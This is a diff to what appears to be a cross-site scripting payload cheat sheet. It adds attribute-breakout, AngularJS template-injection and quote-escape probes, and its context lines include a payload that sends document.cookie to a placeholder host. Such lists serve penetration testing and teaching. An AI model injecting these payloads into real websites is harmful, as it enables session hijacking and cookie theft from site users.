@@ -53,8 +53,13 @@ javascript:alert(document.cookie)
 <iframe src="vulnerable-website#" onload="this.src+='<img src=1 onerror=print()>'" width="800" height="800"></iframe>
 <iframe src="vulnerable-website" onload=this.style.width='100px'>
 <img src=1 oNeRrOr=alert`1`>
+"onmouseover="alert(1)
+{{$on.constructor('alert(1)')()}}
+&apos;-alert(1)-&apos;
+${alert(1)}
 '-alert-'
 \'-alert(1)//
+\"-alert(1)}//
 '"><svg/onload=fetch(`//url/${encodeURIComponent(document.cookie)}`)>
 ```
 - Check for other parameters in the source code to find more possible injection vectors
